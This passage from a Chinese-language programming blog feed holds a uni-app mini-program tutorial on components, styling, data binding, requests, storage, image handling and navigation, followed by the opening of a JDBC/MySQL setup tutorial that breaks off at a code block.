文本是否可选、空格大小、是否解码(默认为true)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">selectable</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">space</span>=<span class="hljs-string">&quot;ensp&quot;</span> <span class="hljs-attr">decode</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span>唱歌 跳舞 打篮球<span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中space中可以选择为ensp（中文字符一半大小），emsp（中文字符空格大小），nbsp（根据字体设置空格大小，无论几个空格都设置成一个字体大小）</p><h3 id="2-view组件"><a href="#2-view组件" class="headerlink" title="2.view组件"></a>2.view组件</h3><p>view组件是类似于div的一个大盒子，一个块级元素</p><p>view中也有很多的配置属性：class、hover-class、hover-stop-propagation、hover-start-time、hover-stay-time</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">view</span> hover-<span class="hljs-keyword">class</span>=&quot;box2-active&quot; hover-<span class="hljs-keyword">start</span>-<span class="hljs-type">time</span>=<span class="hljs-number">2000</span> hover-stay-<span class="hljs-type">time</span>=<span class="hljs-number">2000</span>&gt;big <span class="hljs-type">box</span><br>&lt;<span class="hljs-keyword">view</span> <span class="hljs-keyword">class</span>=&quot;box&quot; hover-<span class="hljs-keyword">class</span>=&quot;box-active&quot; hover-stop-propagation=&quot;true&quot;&gt;<br>&lt;<span class="hljs-type">text</span> selectable=&quot;true&quot; space=&quot;ensp&quot; style=&quot;font-size: 15px&quot;&gt;唱歌 跳舞 打篮球&lt;/<span class="hljs-type">text</span>&gt;<br>&lt;/<span class="hljs-keyword">view</span>&gt;<br>&lt;/<span class="hljs-keyword">view</span>&gt;<br></code></pre></td></tr></table></figure><p>class就是类选项——配置样式，hover-class是点击时触发的样式，hover-stop-propagation用于子组件上，点击子组件时取消父组件的hover-class，hover-start-time是设置样式生效事件，他的参数需要是数字 或者 使用<code>:hover-start-time=&quot;2000&quot;</code>设置，hover-stay-time是控制样式保留时间和上一个类似参数也需要设置成数字或者<code>v-bind</code>绑定</p><h3 id="3-button组件"><a href="#3-button组件" class="headerlink" title="3.button组件"></a>3.button组件</h3><p>button组件顾名思义便是我们的按钮组件，它有5个配置属性</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;button <span class="hljs-attribute">size</span>=<span class="hljs-string">&quot;mini&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;default&quot;</span> <span class="hljs-attribute">plain</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;button1&lt;/button&gt;<br>&lt;button <span class="hljs-attribute">disabled</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attribute">loading</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;button2&lt;/button&gt;<br></code></pre></td></tr></table></figure><p>size可以选择正常大小和缩小版（mini），type是按钮内部颜色（有primary-微信中是绿色，default-白色，warn-红色三个选择）</p><h3 id="4-image组件"><a href="#4-image组件" class="headerlink" title="4.image组件"></a>4.image组件</h3><p>image组件用于存放图片，存放的图片可以调节大小</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;image <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;/static/logo.png&quot;</span> <span class="hljs-attribute">mode</span>=<span class="hljs-string">&quot;aspectFill&quot;</span>&gt;&lt;/image&gt;<br>&lt;image <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;/static/logo.png&quot;</span> <span class="hljs-attribute">mode</span>=<span class="hljs-string">&quot;aspectFile&quot;</span>&gt;&lt;/image&gt;<br></code></pre></td></tr></table></figure><p>src选择图片路径，mode图片缩放模式，如果不写mode，图片就按照规定大小缩放。</p><h2 id="5-样式设置"><a href="#5-样式设置" class="headerlink" title="5.样式设置"></a>5.样式设置</h2><p>uni-app同样为我们提供了强大的样式设置服务</p><p>首先是我们的像素问题，为了实现适用于各个机型，我们采用了<code>rpx</code>-相对像素点的概念</p><p>对于<code>rpx</code>来说，750rpx就是页面宽度的大小，375rpx就是一半的大小</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.div</span>&#123;<br><span class="hljs-attribute">width</span>: <span class="hljs-number">750</span>rpx;<br><span class="hljs-attribute">height</span>: <span class="hljs-number">375</span>rpx;<br><span class="hljs-attribute">background-color</span>: aqua;<br><span class="hljs-attribute">font-size</span>: <span class="hljs-number">30</span>rpx;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是我们可以引入外部的样式</p><p>在style模块，使用<code>@import url(&#39;path&#39;)</code>实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">@<span class="hljs-function"><span class="hljs-keyword">import</span> <span class="hljs-title">url</span><span class="hljs-params">(<span class="hljs-string">&quot;./useStyle.css&quot;</span>)</span></span>;<br></code></pre></td></tr></table></figure><p>这个就引入了同级目录下的css文件</p><p>对于一些全局的样式，我们可以在App.vue中写入，对于局部的样式，我们则在每个单独的文件中写入</p><p>比如，对于一些全局的字体，我们就可以在App.vue中@import引入</p><p>另外还有sass样式，sass样式等我们需要先安装插件（工具 –&gt; 插件安装）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;scss&quot;</span>&gt;</span><span class="css"></span><br><span class="css"><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&quot;./useStyle.css&quot;</span>);</span><br><span class="css"><span class="hljs-selector-class">.div</span>&#123;</span><br><span class="css"><span class="hljs-attribute">width</span>: <span class="hljs-number">750</span>rpx;</span><br><span class="css"><span class="hljs-attribute">height</span>: <span class="hljs-number">375</span>rpx;</span><br><span class="css"><span class="hljs-attribute">background-color</span>: aqua;</span><br><span class="css"><span class="hljs-attribute">font-size</span>: <span class="hljs-number">30</span>rpx;</span><br><span class="css">view&#123;</span><br><span class="css"><span class="hljs-attribute">color</span>: black;</span><br><span class="css">&#125;</span><br><span class="css">&#125;</span><br><span class="css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后我们就可以写scss样式了</p><h2 id="6-数据绑定"><a href="#6-数据绑定" class="headerlink" title="6.数据绑定"></a>6.数据绑定</h2><h3 id="1-data与插值语法"><a href="#1-data与插值语法" class="headerlink" title="1.data与插值语法"></a>1.data与插值语法</h3><p>这里的数据绑定和vue的一模一样，使用data做数据响应式，然后使用插值语法<code>&#123;&#123;&#125;&#125;</code>调用就行了，就和vue一样需要注意，<code>&#123;&#123;&#125;&#125;</code>中的语句需要是js表达式。</p><h3 id="2-v-bind和v-for"><a href="#2-v-bind和v-for" class="headerlink" title="2. v-bind和v-for"></a>2. v-bind和v-for</h3><p>这个和vue的bind，for也是一模一样，直接上代码</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">&quot;imgAdd&quot;</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">&quot;aspectFit&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;p in arr&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;p.position&quot;</span>&gt;</span></span><span class="xquery">&#123;&#123;p<span class="hljs-built_in">.name</span>+<span class="hljs-string">&quot; &quot;</span>+p.age+p<span class="hljs-built_in">.position</span>&#125;</span><span class="xml">&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span></span><br><br><br>data() &#123;<br><span class="hljs-keyword">return</span> &#123;<br>imgAdd:<span class="hljs-string">&#x27;https://i2.hdslb.com/bfs/face/c48a662a43b5358e56c2c2b46d2ac803e251b66c.jpg@240w_240h_1c_1s.webp&#x27;</span>,<br>arr:[<br>&#123;<br><span class="hljs-built_in">name</span>:<span class="hljs-string">&quot;张天&quot;</span>,<br><span class="hljs-built_in">position</span>:<span class="hljs-string">&quot;top&quot;</span>,<br>age:<span class="hljs-string">&quot;19&quot;</span><br>&#125;,<br>&#123;<br><span class="hljs-built_in">name</span>:<span class="hljs-string">&quot;鸽子&quot;</span>,<br><span class="hljs-built_in">position</span>:<span class="hljs-string">&quot;middle&quot;</span>,<br>age:<span class="hljs-string">&quot;20&quot;</span><br>&#125;,<br>&#123;<br><span class="hljs-built_in">name</span>:<span class="hljs-string">&quot;鹌鹑&quot;</span>,<br><span class="hljs-built_in">position</span>:<span class="hljs-string">&quot;jungle&quot;</span>,<br>age:<span class="hljs-string">&quot;18&quot;</span><br>&#125;,<br>]<br>&#125;<br>&#125;,<br></code></pre></td></tr></table></figure><h3 id="3-注册事件"><a href="#3-注册事件" class="headerlink" title="3.注册事件"></a>3.注册事件</h3><p>我们注册事件也是和vue一样</p><p>使用@或者<code>v-on:</code>注册事件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 20是参数，$event是本节点 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;clickEvent(20,$event)&quot;</span>&gt;</span>按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="7-发送请求"><a href="#7-发送请求" class="headerlink" title="7.发送请求"></a>7.发送请求</h2><h3 id="1-发送get请求"><a href="#1-发送get请求" class="headerlink" title="1.发送get请求"></a>1.发送get请求</h3><p>我们通过uni的api发送get请求，形式和ajax类似</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">getMsg</span>(<span class="hljs-params"></span>)</span>&#123;<br>uni.request(&#123;<br><span class="hljs-attr">url</span>:<span class="hljs-string">&quot;http://127.0.0.8080&quot;</span>,<br><span class="hljs-function"><span class="hljs-title">success</span>(<span class="hljs-params">res</span>)</span> &#123;<br><span class="hljs-built_in">console</span>.log(res)<br>&#125;<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-缓存"><a href="#2-缓存" class="headerlink" title="2.缓存"></a>2.缓存</h3><p>对于缓存，我们有存取删除三个方法</p><p>先是储存数据，使用<code>uni.setStorage</code>，其中放入一对<code>key</code>，<code>data</code>作为键值对</p><p>success，fail，complete三个函数作为成功，失败，执行完成之后的回调函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">setStorage</span>(<span class="hljs-params"></span>)</span>&#123;<br>uni.setStorage(&#123;<br><span class="hljs-attr">key</span>:<span class="hljs-string">&quot;id&quot;</span>,<br><span class="hljs-attr">data</span>:<span class="hljs-number">80</span>,<br><span class="hljs-comment">// 函数是成功的回调</span><br><span class="hljs-function"><span class="hljs-title">success</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;存储成功&quot;</span>)<br>&#125;<br>&#125;)<br>&#125;,<br></code></pre></td></tr></table></figure><p>取数据，使用<code>uni.getStorage</code>，放入key作为get的条件</p><p>同样有三个回调函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">getStorage</span>(<span class="hljs-params"></span>)</span>&#123;<br>uni.getStorage(&#123;<br><span class="hljs-attr">key</span>:<span class="hljs-string">&quot;id&quot;</span>,<br><span class="hljs-function"><span class="hljs-title">success</span>(<span class="hljs-params">res</span>)</span>&#123;<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;获取成功&quot;</span>,res.data)<br>&#125;<br>&#125;)<br><br>&#125;<br></code></pre></td></tr></table></figure><p>还有删除数据——<code>uni.removeStorage</code></p><p>但是这些都是异步方法（aync）：</p><p>我们还有同步方法（Sync）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>sync同步<br>uni.setStorageSync(<span class="hljs-string">&#x27;id&#x27;</span>,<span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure><p>get和remove也同样有同步方法</p><p>但是因为同步就没有回调函数</p><h3 id="3-上传图片"><a href="#3-上传图片" class="headerlink" title="3.上传图片"></a>3.上传图片</h3><p>我们可以通过<code>chooseImage</code>函数上传图片</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">chooseImg</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-comment">// 上传图片函数</span><br>uni<span class="hljs-selector-class">.chooseImage</span>(&#123;<br><span class="hljs-comment">// 选择上传数量限制</span><br>count: <span class="hljs-number">3</span>,<br>success: res=&gt; &#123;<br>this<span class="hljs-selector-class">.ImgArr</span> = res<span class="hljs-selector-class">.tempFilePaths</span><br>&#125;<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>对应函数还有：</p><p><img src="https://img-blog.csdnimg.cn/e15763c92f954644921209b9bdb990bf.png" alt="上传图片"></p><p>res返回数据中：有一项<code>tempFilePaths</code>获取上传之后的路径，可以通过这个路径展示图片</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">errMsg:</span> <span class="hljs-string">&quot;chooseImage:ok&quot;</span><br><span class="hljs-attr">tempFilePaths:</span> <span class="hljs-string">Array(1)</span><br><span class="hljs-attr">0:</span> <span class="hljs-string">&quot;blob:http://localhost:8080/91ad9888-97c5-4a8f-9111-556e2004c0ec&quot;</span><br><span class="hljs-attr">length:</span> <span class="hljs-number">1</span><br>[[<span class="hljs-string">Prototype</span>]]<span class="hljs-string">:</span> <span class="hljs-string">Array(0)</span><br><span class="hljs-attr">tempFiles:</span> <span class="hljs-string">Array(1)</span><br><span class="hljs-attr">0:</span> <span class="hljs-string">File</span> &#123;<span class="hljs-attr">name:</span> <span class="hljs-string">&#x27;QQ图片20210527080422.jpg&#x27;</span>, <span class="hljs-attr">lastModified:</span> <span class="hljs-number">1622073855169</span>, <span class="hljs-attr">lastModifiedDate:</span> <span class="hljs-string">Thu</span> <span class="hljs-string">May</span> <span class="hljs-number">27</span> <span class="hljs-number">2021 08:04:15 </span><span class="hljs-string">GMT+0800</span> <span class="hljs-string">(中国标准时间)</span>, <span class="hljs-attr">webkitRelativePath:</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">…</span>&#125;<br><span class="hljs-attr">length:</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>展示图片：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">&lt;image v-<span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;item in ImgArr&quot;</span> <span class="hljs-symbol">:src=<span class="hljs-string">&quot;item&quot;</span>&gt;&lt;/image&gt;</span><br></code></pre></td></tr></table></figure><p>预览图片 ——<code>uni.previewImage(OBJECT)</code></p><p><strong>OBJECT 参数说明</strong></p><table><thead><tr><th align="left">参数名</th><th align="left">类型</th><th align="left">必填</th><th align="left">说明</th><th align="left">平台差异说明</th></tr></thead><tbody><tr><td align="left">current</td><td align="left">String/Number</td><td align="left">详见下方说明</td><td align="left">详见下方说明</td><td align="left"></td></tr><tr><td align="left">urls</td><td align="left">Array<String></td><td align="left">是</td><td align="left">需要预览的图片链接列表</td><td align="left"></td></tr><tr><td align="left">indicator</td><td align="left">String</td><td align="left">否</td><td align="left">图片指示器样式，可取值：”default” - 底部圆点指示器； “number” - 顶部数字指示器； “none” - 不显示指示器。</td><td align="left">App</td></tr><tr><td align="left">loop</td><td align="left">Boolean</td><td align="left">否</td><td align="left">是否可循环预览，默认值为 false</td><td align="left">App</td></tr><tr><td align="left">longPressActions</td><td align="left">Object</td><td align="left">否</td><td align="left">长按图片显示操作菜单，如不填默认为<strong>保存相册</strong></td><td align="left">App 1.9.5+</td></tr><tr><td align="left">success</td><td align="left">Function</td><td align="left">否</td><td align="left">接口调用成功的回调函数</td><td align="left"></td></tr><tr><td align="left">fail</td><td align="left">Function</td><td align="left">否</td><td align="left">接口调用失败的回调函数</td><td align="left"></td></tr><tr><td align="left">complete</td><td align="left">Function</td><td align="left">否</td><td align="left">接口调用结束的回调函数（调用成功、失败都会执行）</td><td align="left"></td></tr></tbody></table><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">previewImg</span><span class="hljs-params">(current)</span></span>&#123;<br><span class="hljs-comment">//img标签中传入代表当前path的item</span><br>uni<span class="hljs-selector-class">.previewImage</span>(&#123;<br>current,<br><span class="hljs-comment">//urls是预览图片列表</span><br>urls:this<span class="hljs-selector-class">.ImgArr</span><br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-跨端兼容"><a href="#4-跨端兼容" class="headerlink" title="4.跨端兼容"></a>4.跨端兼容</h3><p>不同平台的实现代码可能不同</p><p>我们使用注释在不同平台上区别显示代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- #ifdef MP-WEIXIN --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">view</span>&gt;</span>微信小程序<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span><br><span class="hljs-comment">&lt;!-- #endif --&gt;</span><br><br><span class="hljs-comment">&lt;!-- #ifdef H5 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">view</span>&gt;</span>H5页面<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span><br><span class="hljs-comment">&lt;!-- #endif --&gt;</span><br></code></pre></td></tr></table></figure><h2 id="8-页面跳转"><a href="#8-页面跳转" class="headerlink" title="8.页面跳转"></a>8.页面跳转</h2><p>我们小程序实现页面跳转和路由跳转有声明式和编程式两种方法</p><p>声明式：使用navigator标签</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;navigator <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;/pages/List/List&quot;</span> <span class="hljs-attribute">open-type</span>=<span class="hljs-string">&quot;switchTab&quot;</span>&gt;跳转至新闻页面&lt;/navigator&gt;<br></code></pre></td></tr></table></figure><p>其中open-type携带的函数有：</p><p><strong>open-type 有效值</strong></p><table><thead><tr><th align="left">值</th><th align="left">说明</th><th align="left">平台差异说明</th></tr></thead><tbody><tr><td align="left">navigate</td><td align="left">对应 uni.navigateTo 的功能</td><td align="left"></td></tr><tr><td align="left">redirect</td><td align="left">对应 uni.redirectTo 的功能，跳转unload之前的页面</td><td align="left"></td></tr><tr><td align="left">switchTab</td><td align="left">对应 uni.switchTab 的功能，跳转到tabbar页面（始终位于页面下方导航栏的页面）</td><td align="left"></td></tr><tr><td align="left">reLaunch</td><td align="left">对应 uni.reLaunch 的功能</td><td align="left">字节跳动小程序与飞书小程序不支持</td></tr><tr><td align="left">navigateBack</td><td align="left">对应 uni.navigateBack 的功能</td><td align="left"></td></tr><tr><td align="left">exit</td><td align="left">退出小程序，target=”miniProgram”时生效</td><td align="left">微信2.1.0+、百度2.5.2+、QQ1.4.7+</td></tr></tbody></table><p>编程式：</p><p>编程式就是使用函数跳转</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">goTo</span><span class="hljs-params">()</span></span>&#123;<br>uni<span class="hljs-selector-class">.navigateTo</span>(&#123;<br>url:<span class="hljs-string">&quot;/subpages/chat/chat&quot;</span><br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>也有几种方法，和navigator中open-type对应的几个属性相关</p><p>其中<code>switchTab</code>方法会让之前不是tabbar的页面全部卸载</p><p>还可以在url后面携带参数，传参</p><p>在onload的时候通过option获取</p><h2 id="9-组件"><a href="#9-组件" class="headerlink" title="9.组件"></a>9.组件</h2><p>uni的组件和vue的很像，注册方式，引入方式一样</p><h3 id="1-组件生命周期"><a href="#1-组件生命周期" class="headerlink" title="1.组件生命周期"></a>1.组件生命周期</h3><p><code>uni-app</code> 组件支持的生命周期，与vue标准组件的生命周期相同。这里没有页面级的onLoad等生命周期：</p><table><thead><tr><th align="left">函数名</th><th align="left">说明</th><th align="left">平台差异说明</th><th align="left">最低版本</th></tr></thead><tbody><tr><td align="left">beforeCreate</td><td align="left">在实例初始化之前被调用。<a href="https://cn.vuejs.org/v2/api/#beforeCreate">详见(opens new window)</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">created</td><td align="left">在实例创建完成后被立即调用。<a href="https://cn.vuejs.org/v2/api/#created">详见(opens new window)</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">beforeMount</td><td align="left">在挂载开始之前被调用。<a href="https://cn.vuejs.org/v2/api/#beforeMount">详见(opens new window)</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">mounted</td><td align="left">挂载到实例上去之后调用。<a href="https://cn.vuejs.org/v2/api/#mounted">详见 (opens new window)</a>注意：此处并不能确定子组件被全部挂载，如果需要子组件完全挂载之后在执行操作可以使用<code>$nextTick</code><a href="https://cn.vuejs.org/v2/api/#Vue-nextTick">Vue官方文档(opens new window)</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">beforeUpdate</td><td align="left">数据更新时调用，发生在虚拟 DOM 打补丁之前。<a href="https://cn.vuejs.org/v2/api/#beforeUpdate">详见(opens new window)</a></td><td align="left">仅H5平台支持</td><td align="left"></td></tr><tr><td align="left">updated</td><td align="left">由于数据更改导致的虚拟 DOM 重新渲染和打补丁，在这之后会调用该钩子。<a href="https://cn.vuejs.org/v2/api/#updated">详见(opens new window)</a></td><td align="left">仅H5平台支持</td><td align="left"></td></tr><tr><td align="left">beforeDestroy</td><td align="left">实例销毁之前调用。在这一步，实例仍然完全可用。<a href="https://cn.vuejs.org/v2/api/#beforeDestroy">详见(opens new window)</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">destroyed</td><td align="left">Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。<a href="https://cn.vuejs.org/v2/api/#destroyed">详见(opens new window)</a></td><td align="left"></td><td align="left"></td></tr></tbody></table><h3 id="2-组件通信"><a href="#2-组件通信" class="headerlink" title="2.组件通信"></a>2.组件通信</h3><p>组件间通信的方式还是和vue类似</p><p>使用<code>props</code>，<code>$emit</code>，<code>$on</code>进行传值</p><p>自定义事件中就是使用<code>$emit</code>发出参数，<code>$on</code>接收参数</p><h3 id="3-uni-ui"><a href="#3-uni-ui" class="headerlink" title="3.uni-ui"></a>3.uni-ui</h3><p>一个uni提供的组件库</p><p>提供一个类似于element-ui的组件库，通过下载导入到components中</p><p>以组件的方式注册，使用</p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小程序</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JDBC</title>
    <link href="/2022/07/04/JDBC/"/>
    <url>/2022/07/04/JDBC/</url>
    
    <content type="html"><![CDATA[<h1 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>概念：使用java语言操作关系型数据库的一套API</p><p>本质：一套操作所有关系型数据库的规则，即接口</p><p>好处：各数据厂商使用相同接口，java不需要针对不同数据库分别开发</p><h2 id="2-数据库配置"><a href="#2-数据库配置" class="headerlink" title="2.数据库配置"></a>2.数据库配置</h2><h3 id="2-1-navicat链接数据库"><a href="#2-1-navicat链接数据库" class="headerlink" title="2.1 navicat链接数据库"></a>2.1 navicat链接数据库</h3><p>我们首先下载mysql数据库和navicat</p><p>在管理员cmd下进入mysql的bin目录然后通过<code>net start mysql</code>启动数据库</p><p>启动数据库之后打开navicat，点击左上角的链接，进入链接页面</p><p><img src="https://s2.loli.net/2022/07/14/KeAjbqy6GJlt7Bn.png" alt="navicat链接数据库.png"></p><p>链接名可以自己取，端口是mysql的端口，然后输入mysql的root密码就可以登录</p><p>进入之后就可以看到我们数据库的可视化页面</p><h3 id="2-2-idea链接数据库"><a href="#2-2-idea链接数据库" class="headerlink" title="2.2 idea链接数据库"></a>2.2 idea链接数据库</h3><p>然后进入我们的idea，点击右上角的database和加号选择数据库（mysql）</p><p><img src="https://s2.loli.net/2022/07/14/HPRoAYqXjdkBliu.png" alt="创建数据库.png"></p><p>填写好后点击Test Connection测试</p><p>测试成功后点击左上角file中的project structure之后进入加入jar，jar需要在mysql官网上下载</p><p><img src="https://s2.loli.net/2022/07/14/oVCcmGAgIUe8qOl.png" alt="添加jar.png"></p><p>接下来，我们需要建立一个lib文件夹，我们将链接java和mysql的jar文件放入进去，然后将这个文件<code>add as library</code>然后level选择<code>module library</code></p><p>然后我们的数据库操作就算完成了</p><h2 id="3-快速入门"><a href="#3-快速入门" class="headerlink" title="3.快速入门"></a>3.快速入门</h2><p>我们现在使用JDBC查询我们的数据库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 